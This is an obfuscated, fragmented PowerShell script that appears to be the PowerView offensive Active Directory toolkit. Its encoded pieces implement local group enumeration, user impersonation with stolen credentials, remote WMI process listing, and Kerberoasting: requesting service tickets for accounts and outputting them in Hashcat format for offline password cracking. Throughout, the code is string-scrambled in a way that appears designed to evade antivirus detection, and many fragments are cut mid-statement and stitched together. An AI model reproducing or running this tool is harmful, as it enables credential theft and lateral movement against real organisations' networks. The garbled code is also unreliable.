                    YoV{grIJKoUP} JGO &(Z3b{1}{2}{0}{3}Z3b -f S5zbeS5z,S5zAdd-MeS5z,S5zmS5z,S5zrS5z) (Z3b{3}{0}{1}{2}Z3b-fS5zproS5z,S5zpeS5z,S5zrtyS5z,S5zNoteS5z) (Z3b{2}{1}{0}Z3b -fS5zNameS5z,S5zupS5z,S5zGroS5z) (YoV{lOCaIJKlgIJKROIJKUP}.(Z3b{1}{0}{2}Z3b -fS5zkeGeS5z,S5zInvoS5z,S5ztS5z).Invoke((Z3b{0}{1}Z3b-f S5zNS5z,S5zameS5z)))
                    YoV{GIJKROUP} JGO &(Z3b{1}{2}{0}Z3b -fS5zberS5z,S5zAS5z,S5zdd-MemS5z) (Z3b{1}{2}{0}Z3b -fS5zyS5z,S5zNoS5z,S5ztepropertS5z) S5zSIDS5z ((&(Z3b{0}{2}{1}Z3b-f S5zNS5z,S5zObjectS5z,S5zew-S5z) (Z3b{4}{3}{7}{5}{0}{6}{2}{1}Z3b-f S5zpaS5z,S5zyIdentifierS5z,S5zcuritS5z,S5zystem.SeS5z,S5zSS5z,S5z.PrinciS5z,S5zl.SeS5z,S5zcurityS5z)(YoV{loIJKCIJKAlgroIJKUP}.(Z3b{2}{0}{1}Z3b -f S5zvokeGS5z,S5zetS5z,S5zInS5z).Invoke((Z3b{1}{0}{2}Z3b -fS5ztS5z,S5zobjecS5z,S5zsidS5z)),0)).Z3bvaIJKlUeZ3b)
                    YoV{GIJKRIJKOUp} JGO &(Z3b{0}{1}{2}Z3b-f S5zAdS5z,S5zd-MembeS5z,S5zrS5z) (Z3b{2}{0}{1}Z3b-fS5zteS5z,S5zpropertyS5z,S5zNoS5z) (Z3b{2}{0}{1}Z3b -fS5zmmeS5z,S5zntS5z,S5zCoS5z) (YoV{LOIJKCAlIJKgRoUp}.(Z3b{2}{1}{0}Z3b-f S5zeGetS5z,S5znvokS5z,S5zIS5z).Invoke((Z3b{2}{1}{0}Z3b -fS5zptionS5z,S5ziS5z,S5zDescrS5z)))
                    YoV{GrIJKouP}.Z3bPIJKsIJKOBjecTZ3b.Z3bTyIJKpEnAMIJKEsZ3b.(Z3b{1}{0}Z3b-fS5zertS5z,S5zInsS5z).Invoke(0, (Z3b{3}{5}{2}{0}{6}{4}{1}Z3b-fS5zLocalGroS5z,S5zinNTS5z,S5zView.S5z,S5zPowS5z,S5zp.WS5z,S5zerS5z,S5zuS5z))
                    YoV{grIJKOuP}
                }
            }
        }
    }
    
    END {
        if (YoV{lIJKOgIJKOIJKNtOKEN}) {
            &(Z3b{2}{1}{3}{0}Z3b-f S5zevertToSelfS5z,S5zoke-S5z,S5zInvS5z,S5zRS5z) -TokenHandle YoV{lOGoIJKNtOKIJKEN}
        }
    }
}


function get-netLocAlgIJKROIJKUpmeIJKmIJKBIJKER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{0}Z3b-f S5zrocessS5z,S5zPS5z,S5zSShouldPS5z}, S5zS5z)]
    [OutputType({Z3b{1}{0}{3}{2}{5}{4}Z3b-fS5zowerVieS5z,S5zPS5z,S5zoupMeS5z,S5zw.LocalGrS5z,S5zIS5z,S5zmber.APS5z})]
    [OutputType({Z3b{4}{5}{0}{3}{1}{2}Z3b-fS5zupMemS5z,S5zerS5z,S5z.WinNTS5z,S5zbS5z,S5zPowerView.LocS5z,S5zalGroS5z})]
    Param(
        [Parameter(pOSiTiOn = 0, VALUEfRoMPipElInE = YoV{tIJKRUe}, VaLueFROmPIPELINeByPRoPeRTYnAmE = YoV{TIJKRuE})]
        [Alias({Z3b{0}{1}{2}Z3b-f S5zHS5z,S5zostNaS5z,S5zmeS5z}, {Z3b{2}{0}{1}Z3b -fS5znamS5z,S5zeS5z,S5zdnshostS5z}, {Z3b{0}{1}Z3b -fS5znamS5z,S5zeS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ','KTIJKNAmE} = YoV{DOIJKMIJKAIN}
        }
        elseif (YoV{PIJKSBOIJKUNdpIJKARIJKAmeteIJKRS}[(Z3b{0}{1}{2}Z3b -f S5zCS5z,S5zredenS5z,S5ztialS5z)]) {
            YoV{CRIJKEd} = YoV{CRIJKEDIJKENIJKTIaL}.(Z3b{0}{3}{4}{1}{2}Z3b -fS5zGetS5z,S5znS5z,S5ztialS5z,S5zNetworkCrS5z,S5zedeS5z).Invoke()
            YoV{adSIJKIIJKNItTIJKYpe} = 1
            YoV{iNiIJKTnIJKAmE} = YoV{crIJKEd}.Z3bDoMIJKAIJKinZ3b
        }
        else {
            
            YoV{AIJKdSIIJKNIIJKTtyPe} = 3
            YoV{iNiIJKTNIJKAME} = YoV{NUIJKLl}
        }
    }

    PROCESS {
        ForEach (YoV{TIJKAIJKRgETidIJKEIJKNtITy} in YoV{iDIJKENtIIJKTy}) {
            if (-not YoV{PIJKsBOUNdIJKparAmEtEIJKRs}[(Z3b{2}{0}{1}Z3b -f S5ztputS5z,S5zTypeS5z,S5zOuS5z)]) {
                if (YoV{tAIJKRgEIJKTIdEntIJKity} -match (((Z3b{3}{4}{5}{6}{2}{1}{0}{7}Z3b-fS5zA-Za-z S5z,S5zT[S5z,S5zpTmpS5z,S5z^[AS5z,S5z-Za-S5z,S5zzS5z,S5z]+mS5z,S5z]+S5z)).Z3bRIJKEpIJKlaCEZ3b(([Char]109+[Char]112+[Char]84),S5z5rjS5z))) {
                    YoV{aDIJKSIJKoIJKUIJKTpuTTYpe} = YoV{nAIJKmEIJKTYPEs}[(Z3b{1}{2}{3}{0}Z3b-f S5zimpleS5z,S5zDS5z,S5zoS5z,S5zmainSS5z)]
                }
                else {
                    YoV{AdIJKSoIJKUIJKTPIJKUttype} = YoV{nAIJKmETYpIJKES}[S5zNT4S5z]
                }
            }
            else {
                YoV{AIJKDIJKSouTIJKpuIJKTtYpe} = YoV{NaIJKMEtYPIJKes}[YoV{oUIJKTPUIJKTIJKTYPE}]
            }

            YoV{TrAnIJKSlAIJKTE} = &(Z3b{2}{0}{1}Z3b -fS5zw-ObjS5z,S5zectS5z,S5zNeS5z) -ComObject (Z3b{1}{3}{0}{2}Z3b-f S5znslatS5z,S5zNameTS5z,S5zeS5z,S5zraS5z)

            if (YoV{PSbOuNDPaIJKRIJKAIJKmIJKetIJKers}[(Z3b{0}{2}{1}Z3b -f S5zCreS5z,S5zlS5z,S5zdentiaS5z)]) {
                try {
                    YoV{CRIJKEd} = YoV{CRIJKEdeIJKNTiAl}.(Z3b{2}{4}{5}{0}{3}{6}{1}Z3b-f S5zCS5z,S5zalS5z,S5zGetNS5z,S5zredenS5z,S5zetwS5z,S5zorkS5z,S5ztiS5z).Invoke()

                    &(Z3b{1}{2}{0}Z3b -fS5zodS5z,S5zInvoS5z,S5zke-MethS5z) YoV{TIJKRanSIJKLaIJKTe} (Z3b{2}{0}{1}Z3b -f S5znitES5z,S5zxS5z,S5zIS5z) (
                        YoV{ADIJKSiniIJKTTIJKype},
                        YoV{iIJKNIJKIIJKTnaMe},
                        YoV{crIJKED}.Z3bUIJKsIJKERNAMEZ3b,
                        YoV{CIJKRed}.Z3bdoMAIJKiNZ3b,
                        YoV{cIJKRED}.Z3bpIJKAIJKSSWorDZ3b
                    )
                }
                catch {
                    &(Z3b{3}{0}{1}{2}{4}Z3b -f S5ziS5z,S5zte-VerboS5z,S5zsS5z,S5zWrS5z,S5zeS5z) (S5z[CS5z+S5zoS5z+S5znvert-ADS5z+S5zName] S5z+S5zErroS5z+S5zr S5z+S5zinS5z+S5ziS5z+S5ztialiS5z+S5zzing S5z+S5ztS5z+S5zrS5z+S5zanslation S5z+S5zforS5z+S5z S5z+Z3bS5zYoVIdentityS5z Z3b+S5zusingS5z+S5z S5z+S5zalS5z+S5zterS5z+S5znate S5z+S5zcS5z+S5zrS5z+S5zeS5z+S5zdentials S5z+S5z: S5z+Z3bYoV_Z3b)
                }
            }
            else {
                try {
                    YoV{NIJKUlL} = &(Z3b{1}{0}{2}Z3b -fS5z-MethoS5z,S5zInvokeS5z,S5zdS5z) YoV{TRanIJKsLaIJKTe} (Z3b{0}{1}Z3b -f S5zIniS5z,S5ztS5z) (
                        YoV{aDSINIIJKTTIJKYIJKpE},
                        YoV{INIIJKTNaIJKmE}
                    )
                }
                catch {
                    &(Z3b{4}{0}{3}{1}{2}Z3b -f S5zerS5z,S5zoS5z,S5zseS5z,S5zbS5z,S5zWrite-VS5z) (S5z[S5z+S5zConS5z+S5zvert-ADNS5z+S5zamS5z+S5ze]S5z+S5z S5z+S5zErS5z+S5zrorS5z+S5z S5z+S5zinitS5z+S5ziaS5z+S5zliS5z+S5zzingS5z+S5z S5z+S5ztranslS5z+S5zaS5z+S5ztS5z+S5zion S5z+S5zfoS5z+S5zr S5z+Z3bS5zYoVIdentityS5z Z3b+S','-fS5zCS5z,S5zredenS5z,S5ztialS5z)]) { YoV{aRIJKguMIJKEnTs}[(Z3b{1}{2}{0}Z3b -fS5ztialS5z,S5zCreS5z,S5zdenS5z)] = YoV{CrEDEIJKNtIJKiaL} }

        if (YoV{PsbOIJKUndIJKPAramIJKeIJKTERS}[(Z3b{1}{0}Z3b -fS5zPS5z,S5zLDAS5z)] -or YoV{psIJKBOUNdIJKPIJKAIJKRIJKAmeTERs}[(Z3b{0}{1}Z3b -f S5zSS5z,S5zerv','}{1}Z3b -f S5zAS5z,S5zPFilterS5z,S5zLDS5z)] = YoV{tAIJKRGEIJKTlDIJKAPFIJKiltIJKEr} }
        if (YoV{pSBOUndIJKPaRaIJKmIJKeteRs}[(Z3b{0}{1}{2}{3}Z3b -f S5zTargetS5z,S5zSearcS5z,S5zhS5z,S5zBaseS5z)]) { YoV{tAIJKRGIJKEtIJKsEarIJKcIJKheraRgumENIJKTs}[(Z3b{2}{1}{0}Z3b-fS5zaseS5z,S5zrchBS5z,S5zSeaS5z)] = YoV{taRGIJKEtIJKSeIJKARcHbIJKAsE} }
        if (YoV{pIJKsBIJKOUnDIJKpARamETERs}[(Z3b{0}{1}Z3b-f S5zServeS5z,S5zrS5z)]) { YoV{targeIJKTsEaRcIJKHIJKeRargUIJKmeIJKNtS}[(Z3b{1}{2}{0}Z3b-f S5zrS5z,S5zSS5z,S5zerveS5z)] = YoV{SIJKErVIJKer} }
        if (YoV{PSIJKBoUIJKNDpArAmETIJKERS}[(Z3b{2}{1}{0}Z3b-f S5zarchScopeS5z,S5zeS5z,S5zSS5z)]) { YoV{tIJKAIJKRgEtsearcheRaIJKRIJKguMENtS}[(Z3b{2}{0}{1}Z3b-f S5zhScopS5z,S5zeS5z,S5zSearcS5z)] = YoV{SEaIJKRchIJKSCoIJKpE} }
        if (YoV{pSBIJKoUNIJKDIJKParamEIJKTEIJKRs}[(Z3b{1}{2}{0}Z3b-f S5zSizeS5z,S5zResultPaS5z,S5zgeS5z)]) { YoV{tArgeTIJKseIJKArIJKCIJKHeIJKRArIJKGUmEntS}[(Z3b{0}{1}{2}Z3b-f S5zResultPageS5z,S5zSiS5z,S5zzeS5z)] = YoV{rIJKeSultPIJKAGEsiIJKZE} }
        if (YoV{PsIJKBOuIJKNdIJKpaRaMeTERs}[(Z3b{0}{3}{2}{1}Z3b-f S5zSeS5z,S5zeLimitS5z,S5zrTimS5z,S5zrveS5z)]) { YoV{tarGEIJKTSEaRIJKCHERArIJKguMIJKEIJKNIJKTs}[(Z3b{1}{3}{2}{0}Z3b -f S5zLimitS5z,S5zServeS5z,S5zmeS5z,S5zrTiS5z)] = YoV{sIJKEIJKRvIJKeRTIMELIJKiMit} }
        if (YoV{pSbouIJKNDPARAIJKMeIJKTeIJKRS}[(Z3b{2}{0}{1}Z3b -fS5zmbsS5z,S5ztoneS5z,S5zToS5z)]) { YoV{tARIJKGETsEARIJKcHeRIJKARgIJKUMENTs}[(Z3b{2}{1}{0}Z3b-f S5zbstoneS5z,S5zomS5z,S5zTS5z)] = YoV{tIJKOMbsToIJKNe} }
        if (YoV{pSIJKBoUNDIJKparIJKAMIJKeTIJKerS}[(Z3b{0}{1}{2}Z3b-f S5zCrS5z,S5zedentiaS5z,S5zlS5z)]) { YoV{TArIJKGetIJKsEIJKArIJKchErarIJKguMIJKEnTS}[(Z3b{1}{0}{2}Z3b -fS5zredeS5z,S5zCS5z,S5zntialS5z)] = YoV{CIJKREDenTIJKiAL} }

        YoV{PrInIJKCIPalseARIJKcIJKhIJKERaRIJKgumeIJKNTS} = @{
            (Z3b{2}{1}{0}Z3b-f S5zyS5z,S5ztitS5z,S5zIdenS5z) = YoV{PRinIJKCIpIJKAlIJKidentiIJKTY}
            (Z3b{0}{1}{3}{2}Z3b-f S5zPrS5z,S5zopeS5z,S5ztiesS5z,S5zrS5z) = (Z3b{1}{7}{4}{8}{5}{2}{0}{6}{3}Z3b -fS5zectS5z,S5zdistiS5z,S5zme,objS5z,S5zidS5z,S5zishedS5z,S5zaS5z,S5zsS5z,S5znguS5z,S5znS5z)
        }
        if (YoV{PsIJKBIJKoUndpIJKAIJKRIJKAMeTerS}[(Z3b{4}{3}{2}{0}{1}Z3b -fS5zDomaS5z,S5zinS5z,S5zincipalS5z,S5zrS5z,S5zPS5z)]) { YoV{PrIJKinciIJKpalSearCHERaIJKRIJKGIJKUmIJKeNts}[(Z3b{0}{2}{1}Z3b -fS5zDomS5z,S5znS5z,S5zaiS5z)] = YoV{PrInIJKCIJKIPI','ERZ3b, MANDatoRy = YoV{TIJKRuE}, ValUeFROMPipElInE = YoV{TrIJKUe})]
        [ValidateScript({ YoV{_}.Z3bPIJKSOBjEIJKCTZ3b.Z3btyPEIJKNIJKAmesZ3b[0] -eq (Z3b{1}{2}{0}Z3b -fS5zserS5z,S5zPS5z,S5zowerView.US5z) })]
        [Object[]]
        YoV{UIJKSER},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zhnS5z,S5zJoS5z}, {Z3b{2}{1}{0}Z3b -f S5ztS5z,S5zashcaS5z,S5zHS5z})]
        [Alias({Z3b{2}{1}{0}Z3b -fS5zatS5z,S5zmS5z,S5zForS5z})]
        [String]
        YoV{oIJKUTpIJKUTFOrmIJKAT} = (Z3b{2}{0}{1}Z3b -f S5zcaS5z,S5ztS5z,S5zHashS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKREDeIJKNtial} =  YoV{JIJKFi}::Z3bemPIJKTYZ3b
    )

    BEGIN {
        YoV{NIJKULl} =   YoV{wIJKS63D}::(Z3b{1}{2}{4}{0}{3}Z3b -f S5zthPartiaS5z,S5zLS5z,S5zoadWS5z,S5zlNameS5z,S5ziS5z).Invoke((Z3b{4}{2}{5}{1}{6}{0}{3}Z3b -f S5ztyModeS5z,S5zntS5z,S5zstem.S5z,S5zlS5z,S5zSyS5z,S5zIdeS5z,S5ziS5z))

        if (YoV{psbIJKouNDParAMIJKetIJKERS}[(Z3b{2}{0}{1}Z3b-fS5ztiaS5z,S5zlS5z,S5zCredenS5z)]) {
            YoV{LoGIJKONIJKTOken} = &(Z3b{7}{2}{0}{4}{3}{6}{5}{1}Z3b-f S5zIS5z,S5znS5z,S5zoke-UserS5z,S5zpersS5z,S5zmS5z,S5zioS5z,S5zonatS5z,S5zInvS5z) -Credential YoV{crIJKedEnTIJKIaL}
        }
    }

    PROCESS {
        i',' }
       ','Z3b{2}{1}{0}Z3b -f S5zrrayS5z,S5zyteAS5z,S5zToBS5z).Invoke() JGO &(Z3b{0}{3}{2}{1}Z3b -f S5zFS5z,S5zctS5z,S5zObjeS5z,S5zorEach-S5z) {YoV{_}.(Z3b{2}{1}{0}Z3b -fS5ztringS5z,S5zSS5z,S5zToS5z).Invoke(S5zXS5z).(Z3b{1}{0}Z3b -fS5zftS5z,S5zPadLeS5z).Invoke(2,S5z0S5z)})) -Replace (Z3b{0}{1}Z3b-f S5z(S5z,S5z..)S5z),S5z5rjYoV1S5z
                        YoV{IDENtItIJKyIJKFiIJKLTIJKeR} += Z3b(objectguid=YoVGuidByteString)Z3b
                    }
                    catch {
                        YoV{IDIJKeNTIJKIIJKTyFIltIJKeR} += Z3b(name=YoVIdentityInstance)Z3b
                    }
               ','JKTComPutIJKeIJKRS}) {
                YoV{COIJKUIJKNTER} = YoV{COuIJKNTIJKeR} + 1

                
                &(Z3b{','S {
        if (YoV{PSboUIJKNDParAIJKmeIJKTeRs}[(Z3b{1}{0}{2}Z3b-fS5ztiS5z,S5zIdenS5z,S5ztyS5z)]) { YoV{uSIJKERSeaRIJKcIJKhEIJKRArIJKgumeNIJKTS}[(Z3b{0}{1}Z3b-f S5zIdentitS5z,S5zyS5z)] = YoV{iIJKDeIJKNtITY} }
        &(Z3b{1}{3}{0}{2}Z3b -fS5zDomainUsS5z,S5zGetS5z,S5zerS5z,S5z-S5z) @UserSearcherArguments JGO &(Z3b{0}{1}{3}{2}Z3b -fS5zWheS5z,S5zrS5z,S5zbjectS5z,S5ze-OS5z) {YoV{_}.Z3bsAmAIJKcCIJKOUIJKNtNAmeZ3b -ne (Z3b{1}{0}Z3b-fS5zbtgtS5z,S5zkrS5z)} JGO &(Z3b{2}{5}{0}{1}{4}{6}{3}Z3b-fS5zmaS5z,S5zinS5z,S5zGeS5z,S5ztS5z,S5zSPNTicS5z,S5zt-DoS5z,S5zkeS5z) -OutputFormat YoV{OutPIJKUTFIJKoRIJKMaT}
    }

    END {
        if (YoV{lIJKoGIJKontOIJKKEN}) {
            &(Z3b{3}{2}{0}{1}{4}Z3b -fS5zRevertS5z,S5zToSelS5z,S5zvoke-S5z,S5zInS5z,S5zfS5z) -TokenHandle YoV{loGONIJKTIJKokIJKEn}
   ','5z)(YoV{UsERrIJKEsIJKULT}.Z3bPRoIJKpeRTiIJKEsZ3b[(Z3b{0}{2}{3}{4}{1}Z3b-fS5zhomeS5z,S5zoryS5z,S5zdirS5z,S5zeS5z,S5zctS5z)])}if (YoV{uIJKsERRIJKeSuIJKLT}.Z3bPrOIJKpEIJKRTieSZ3b[(Z3b{2}{1}{0}Z3b -f S5zhS5z,S5zriptpatS5z,S5zscS5z)]) {&(Z3b{2}{1}{0}Z3b-f S5zit-PathS5z,S5zlS5z,S5zSpS5z)(YoV{usIJKEIJKRREsIJKUlt}.Z3bproIJKPERtIJKiESZ3b[(Z3b{3}{0}{1}{2}Z3b -fS5zrS5z,S5ziptS5z,S5zpathS5z,S5zscS5z)])}if (YoV{UIJKsIJKERReIJKSUlT}.Z3bPIJKROIJKpErIJKTiesZ3b[(Z3b{1}{2}{0}Z3b -fS5zepathS5z,S5zprofiS5z,S5zlS5z)]) {&(Z3b{0}{3}{2}{1}Z3b-fS5zSpS5z,S5zhS5z,S5zit-PatS5z,S5zlS5z)(YoV{usIJKErRIJKeIJKSUlt}.Z3bPrOpErIJKTIIJKESZ3b[(Z3b{2}{1}{0}Z3b-fS5zilepathS5z,S5zofS5z,S5zprS5z)])}}) JGO &(Z3b{3}{2}{1}{0}Z3b -fS5ztS5z,S5zObjecS5z,S5zort-S5z,S5zSS5z) -Unique
            }
        }
        else {
            YoV{usEIJKRIJKsEarCHEr} = &(Z3b{0}{3}{2}{1}Z3b-fS5zGetS5z,S5znSearcherS5z,S5ziS5z,S5z-DomaS5z) @SearcherArguments
            YoV(ForEach(YoV{uSERRIJKEIJKSULT} in YoV{UIJKSIJKerSeARcher}.(Z3b{1}{0}Z3b-f S5zndAllS5z,S5zFiS5z).Invoke()) {if (YoV{usEIJKRrESUIJKlt}.Z3bpIJKROpERTiIJKeSZ3b[(Z3b{2}{1}{0}Z3b -fS5zmedirectoryS5z,S5zoS5z,S5zhS5z)]) {&(Z3b{1}{0}{3}{2}Z3b -f S5zpliS5z,S5zSS5z,S5z-PathS5z,S5ztS5z)(YoV{UsErReIJKsIJKULT}.Z3bpRoIJKPERtIIJKEsZ3b[(Z3b{2}{1}{0}{3}Z3b -f S5zcS5z,S5zeS5z,S','KIIJKZe} = 200,

        [Parameter(PARAmETErSetnAmE = Z3bLDIJKAPZ3b)]
        [ValidateRange(1, 10000)]
        [Int]
        YoV{SERVIJKErtIJKIIJKMeLImIJKiT},

        [Parameter(PArAMeTErSeTname = Z3bLDIJKApZ3b)]
        [Switch]
        YoV{tOIJKmBIJKStoIJKNe},

        [Alias({Z3b{0}{2}{3}{1}Z3b -fS5zRetuS5z,S5zOneS5z,S5zrS5z,S5znS5z})]
        [Switch]
        YoV{fIIJKNIJKdOnE},

        [Parameter(pArAMEtersETNAME = Z3bLdIJKApZ3b)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKedEIJKNTiaL} =  (&(Z3b{2}{1}{0}Z3b-f S5zbleS5z,S5zariaS5z,S5zVS5z) JfI).Z3bvaIJKlUeZ3b::Z3bEMIJKPTyZ3b
    )

    BEGIN {
        YoV{tRustIJKAIJKTTrIIJKBUtIJKES} = @{
            [uint32](Z3b{0}{1}{2}Z3b -f S5z0x00S5z,S5z0S5z,S5z00001S5z) = (Z3b{2}{1}{0}Z3b-fS5z_TRANSITIVES5z,S5zONS5z,S5zNS5z)
            [uint32](Z3b{2}{0}{1}Z3b-fS5zx000S5z,S5z00002S5z,S5z0S5z) = (Z3b{1}{3}{0}{2}Z3b -f S5zNLS5z,S5zUPLEVS5z,S5zYS5z,S5zEL_OS5z)
            [uint32](Z3b{1}{2}{0}Z3b -f S5z004S5z,S5z0x0S5z,S5z0000S5z) = (Z3b{2}{1}{0}Z3b-f S5zSS5z,S5zSIDS5z,S5zFILTER_S5z)
            [uint32](Z3b{2}{0}{1}Z3b -fS5z00S5z,S5z0008S5z,S5z0x00S5z) = (Z3b{4}{5}{0}{3}{2}{1}Z3b-fS5z_S5z,S5zES5z,S5zANSITIVS5z,S5zTRS5z,S5zFORS5z,S5zESTS5z)
            [uint32](Z3b{1}{0}{2}{3}Z3b -fS5zx00S5z,S5z0S5z,S5z00001S5z,S5z0S5z) = (Z3b','-fS5zchS5z,S5zSearS5z,S5zBaseS5z)])) {
                        
                        
                        YoV{IdIJKenIJKTIJKitIJKYdOMain} = YoV{idIJKENtItYinIJKStAIJKNce}.(Z3b{0}{2}{1}Z3b -fS5zSubS5z,S5zngS5z,S5zStriS5z).Invoke(YoV{iIJKDeNtItyIJKINstanIJKCE}.(Z3b{1}{0}Z3b-f S5zndexOfS5z,S5zIS5z).Invoke(S5zDC=S5z)) -replace S5zDC=S5z,S5zS5z -replace S5z,S5z,S5z.S5z
                        &(Z3b{0}{2}{1}Z3b -f S5zWrite-VeS5z,S5zboseS5z,S5zrS5z) (S5z[Get-DoS5z+S5zmaiS5z+S5znS5z+S5zSuS5z+S5zbnet] S5z+S5zExtrS5z+S5zacS5z+S5zted S5z+S5zdomS5z+S5zain S5z+Z3bS5zYoVIdentityDomainS5z Z3b+S5zfromS5z+S5z S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                        YoV{SearIJKcHeIJKRIJKARGIJKUmEIJKNts}[(Z3b{1}{0}Z3b-fS5zmainS5z,S5zDoS5z)] = YoV{IIJKDENIJKTityDIJKomIJKAIN}
                        YoV{SUIJKBNIJKETIJKSEAIJKRCHeR} = &(Z3b{2}{1}{3}{0}Z3b -f S5zerS5z,S5zDomS5z,S5zGet-S5z,S5zainSearchS5z) @SearcherArguments
                        if (-not YoV{SUIJKBNetsEARIJKCIJKhEr}) {
                            &(Z3b{1}{2}{0}{3}Z3b -f S5zWarnS5z,S5zWrS5z,S5zite-S5z,S5zingS5z) (S5z[GS5z+S5zet-S5z+S5zDomaS5z+S5zinSubneS5z+S5zt] S5z+S5zUS5z+S5znaS5z+S5zble S5z+S5ztS5z+S5zo S5z+S5zretrievS5z+S5zeS5z+S5z S5z+S5zdS5z+S5zomaiS5z+S5zn S5z+S5zsearchS5z+S5zerS5z+S5z S5z+S5zfS5z+S5zor S5z+Z3bS5zYoVIdentityDomainS5zZ3b)
                        }
                    }
                }
                else {
                    try {
                        YoV{GIJKUIIJKdbIJKytIJKestrING} = (-Join (([Guid]YoV{IDENTiIJKTyIJKIIJKNsTaIJKNce}).(Z3b{1}{2}{0}Z3b-f S5zrrayS5z,S5zToByteS5z,S5zAS5z).Invoke() JGO &(Z3b{3}{1}{4}{0}{2}Z3b-f S5zjeS5z,S5zrEach-S5z,S5zctS5z,S5zFoS5z,S5zObS5z) {YoV{_}.(Z3b{0}{2}{1}Z3b -f S5zToStS5z,S5zingS5z,S5zrS5z).Invoke(S5zXS5z)',')] = YoV{usIJKErdIJKomIJKAIn} }
        if (YoV{PSIJKBOuNdIJKPIJKAraMEIJKTerS}[(Z3b{0}{4}{1}{3}{2}Z3b -f S5zUserLDS5z,S5zPS5z,S5zilterS5z,S5zFS5z,S5zAS5z)]) { YoV{USErIJKSEArCHIJKerIJKAIJKRguMIJKEnTs}[(Z3b{0}{1}{2}Z3b-f S5zLDS5z,S5zAPFS5z,S5zilterS5z)] = YoV{usEIJKRIJKLIJKDAIJKpfiltER} }
        if (YoV{psIJKBouNdpaRAmEtIJKEIJKRs}[(Z3b{0}{1}{2}Z3b -fS5zUsS5z,S5zerSearS5z,S5zchBaseS5z)]) { YoV{uIJKsErseaIJKRcHEraRGUIJKMeNIJKTs}[(Z3b{2}{1}{0}Z3b -f S5zhBaseS5z,S5zearcS5z,S5zSS5z)] = YoV{UseIJKRsEAIJKRIJKChIJKBase} }
        if (YoV{pSbIJKouNIJKDPIJKARIJKAMEtErS}[(Z3b{0}{3}{2}{1}Z3b-fS5zUserAdS5z,S5ztS5z,S5zCounS5z,S5zminS5z)]) { YoV{USeIJKRseIJKAIJKRcHErIJKArGuIJKMEnIJKTs}[(Z3b{1}{0}{2}Z3b-f S5znS5z,S5zAdmiS5z,S5zCountS5z)] = YoV{usEIJKRAdMIJKInIJKCIJKouNt} }
        if (YoV{PSboUndPAraIJKmIJKetEIJKRs}[(Z3b{1}{0}Z3b-fS5zrS5z,S5zServeS5z)]) { YoV{UserSEarcIJKHeRArIJKGUIJKMeNtS}[(Z3b{0}{1}Z3b-fS5zSS5z,S5zerverS5z)] = YoV{seRvIJKER} }
        if (YoV{PsbIJKOUNdPAIJKRIJKAMIJKeTIJKERs}[(Z3b{1}{0}{2}Z3b-fS5zchSS5z,S5zSearS5z,S5zcopeS5z)]) { YoV{uIJKsIJKeRseIJKARChERargUMIJKeIJKNIJKTs}[(Z3b{2}{1}{0}Z3b-f S5zScopeS5z,S5zchS5z,S5zSearS5z)] = YoV{SEIJKArcHsIJKCOIJKpE} }
        if (YoV{pIJKSBoUNdPIJKAIJKRaMETIJKers}[(Z3b{3}{2}{0}{4}{1}Z3b-fS5zsultPagS5z,S5zeS5z,S5zeS5z,S5zRS5z,S5zeSizS5z)]) { YoV{UIJKSeRseIJKARchIJKErArGUMEIJKNIJKTs}[(Z3b{3}{0}{4}{1}{2}Z3b-f S5zaS5z,S5zSiS5z,S5zzeS5z,S5zResultPS5z,S5zgeS5z)] = YoV{reSultpAIJKGIJKesIIJKZe} }
        if (YoV{psBouNIJKDIJKParAmeIJKTERS}[(Z3b{1}{0}{2}{3}Z3b-fS5zrveS5z,S5zSeS5z,S5zrTimeLimiS5z,S5ztS5z)]) { YoV{UsErIJKSEaIJKRCHERaIJKRGUMIJKEIJKNTS}[(Z3b{0}{3}{4}{2}{1}Z3b -fS5zServerTimS5z,S5zitS5z','         YoV{PIJKROCIJKEIJKsSEs} = &(Z3b{1}{3}{2}{0}Z3b -fS5zssS5z,S5zGS5z,S5z-WMIProceS5z,S5zetS5z) -ComputerName YoV{TargIJKeTcOIJKmIJKpUTer} -ErrorAction (Z3b{4}{3}{1}{0}{2}Z3b -fS5zoS5z,S5zlyCS5z,S5zntinueS5z,S5ztS5z,S5zSilenS5z)
                    }
                    ForEach (YoV{PIJKRoIJKceSs} in YoV{prIJKOCIJKESses}) {
                        
                        if (YoV{prIJKOCeSIJKsNAIJKme}) {
                            if (YoV{prIJKocesIJKSIJKName} -Contains YoV{pIJKROCEsS}.Z3bPIJKRocIJKESSNaMEZ3b) {
                                YoV{PrIJKoIJKcESS}
                            }
                        }
                        
        ','{0}{1}Z3b-f S5zvS5z,S5zARiABlES5z)  (Z3buXZ3b+Z3b2eZ3b)  -VAl  )::Z3bSIJKTaZ3b

        
        
        if (-not YoV{NoIJKimIJKpoRts}) {
            
            YoV{myvIJKAIJKRs} = &(Z3b{2}{1}{0}{3}Z3b-fS5zrS5z,S5z-VaS5z,S5zGetS5z,S5ziableS5z) -Scope 2

            
            YoV{VoIJKRIJKBIJKidDIJKENVars} = @(S5z?S5z,(Z3b{0}{1}Z3b -f S5zaS5z,S5zrgsS5z),(Z3b{3}{0}{1}{2}Z3b -f S5zleFileS5z,S5zNaS5z,S5zmeS5z,S5zConsoS5z),(Z3b{1}{0}Z3b -f S5zorS5z,S5zErrS5z),(Z3b{0}{2}{1}{3}Z3b-fS5zExecutS5z,S5zntS5z,S5zionCoS5z,S5zextS5z),(Z3b{1}{0}Z3b-fS5zeS5z,S5zfalsS5z),(Z3b{0}{1}Z3b -fS5zHS5z,S5zOMES5z),(Z3b{0}{1}Z3b -fS5zHoS5z,S5zstS5z),(Z3b{0}{1}Z3b-fS5ziS5z,S5znputS5z),(Z3b{0}{2}{1}Z3b -fS5zInputOS5z,S5ztS5z,S5zbjecS5z),(Z3b{0}{2}{3}{1}Z3b -fS5zMS5z,S5zountS5z,S5zaS5z,S5zximumAliasCS5z),(Z3b{0}{4}{3}{2}{1}Z3b-f S5zMaS5z,S5zountS5z,S5zumDriveCS5z,S5zmS5z,S5zxiS5z),(Z3b{1}{0}{2}{3}Z3b -fS5zimumErrorCoS5z,S5zMaxS5z,S5zunS5z,S5ztS5z),(Z3b{1}{0}{2}{3}{5}{4}Z3b 